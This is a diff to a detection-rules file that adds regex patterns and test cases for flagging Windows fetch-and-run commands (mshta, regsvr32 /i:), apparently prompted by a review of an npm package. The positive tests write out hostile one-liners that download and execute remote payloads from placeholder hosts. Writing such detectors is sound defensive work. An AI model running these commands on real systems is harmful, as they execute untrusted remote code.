@@ -298,6 +298,9 @@ rules:
         # `Invoke-RestMethod` are how one-liners are written.
         - '\b(?:[Ii][Nn][Vv][Oo][Kk][Ee]-[Ww][Ee][Bb][Rr][Ee][Qq][Uu][Ee][Ss][Tt]|[Ii][Nn][Vv][Oo][Kk][Ee]-[Rr][Ee][Ss][Tt][Mm][Ee][Tt][Hh][Oo][Dd]|[Ii][Ww][Rr]|[Ii][Rr][Mm])\b|\b(?:[Dd][Oo][Ww][Nn][Ll][Oo][Aa][Dd][Ss][Tt][Rr][Ii][Nn][Gg]|[Dd][Oo][Ww][Nn][Ll][Oo][Aa][Dd][Ff][Ii][Ll][Ee]|[Dd][Oo][Ww][Nn][Ll][Oo][Aa][Dd][Dd][Aa][Tt][Aa])\b'
         - '\bscp\s|\brsync\s'
+        # A Windows program handed a URL fetches it: `mshta https://...`, `regsvr32 /i:https://...`.
+        - '\b[Mm][Ss][Hh][Tt][Aa](?:\.[Ee][Xx][Ee])?["\x27]?\s{1,8}["\x27]?https?://'
+        - '\b[Rr][Ee][Gg][Ss][Vv][Rr]32(?:\.[Ee][Xx][Ee])?\b[^\n]{0,80}/[Ii]:["\x27]?https?://'
     tests:
       positive:
         - "curl -sSL https://example.com/x.sh"
@@ -481,6 +484,11 @@ rules:
         - '(?<![$]\()\b(?:eval|source)\b[^\n]{0,40}[$]\([^)\n]{0,200}\b(?:curl|wget|fetch)\b'
         - '\b(?:eval|source|\.)\s[^\n]{0,40}<\([^)\n]{0,200}\b(?:curl|wget|fetch)\b'
         - '\b(?:IEX|Invoke-Expression)\b[^\n]{0,120}\b(?:DownloadString|DownloadData|DownloadFile)\b'
+        # Windows programs that fetch and run in one step, given a URL: `mshta https://...` runs
+        # a remote HTA, `regsvr32 /i:https://... scrobj.dll` a remote scriptlet. Neither has a
+        # use for a URL other than running what it serves (review 98: abhiktestnpm).
+        - '\b[Mm][Ss][Hh][Tt][Aa](?:\.[Ee][Xx][Ee])?["\x27]?\s{1,8}["\x27]?https?://'
+        - '\b[Rr][Ee][Gg][Ss][Vv][Rr]32(?:\.[Ee][Xx][Ee])?\b[^\n]{0,80}/[Ii]:["\x27]?https?://'
     tests:
       positive:
         - '$o="$env:TEMP\\1.cmd"; & curl.exe -k -L -Ss "https://files.example.invalid/x.bat" -o $o; & $o'
@@ -495,7 +503,11 @@ rules:
         - "iex (iwr https://example.invalid/x).Content"
         - "Invoke-Expression (Invoke-RestMethod https://example.invalid/x)"
         - "iwr https://example.invalid/p.exe -OutFile $env:TEMP\\p.exe; Start-Process $env:TEMP\\p.exe"
+        - '"C:\\Windows\\system32\\mshta.exe" https://example.invalid/a.hta'
+        - "regsvr32 /s /n /u /i:https://example.invalid/a.sct scrobj.dll"
       negative:
+        - "mshta.exe local\\app.hta"
+        - "regsvr32 /s mylib.dll"
         - 'curl -L -o release.json https://api.example.invalid/latest; jq .tag release.json'
         - 'Invoke-WebRequest https://example.invalid/a.zip -OutFile a.zip; Expand-Archive a.zip'
         - "iwr https://example.invalid/x -OutFile release.zip"
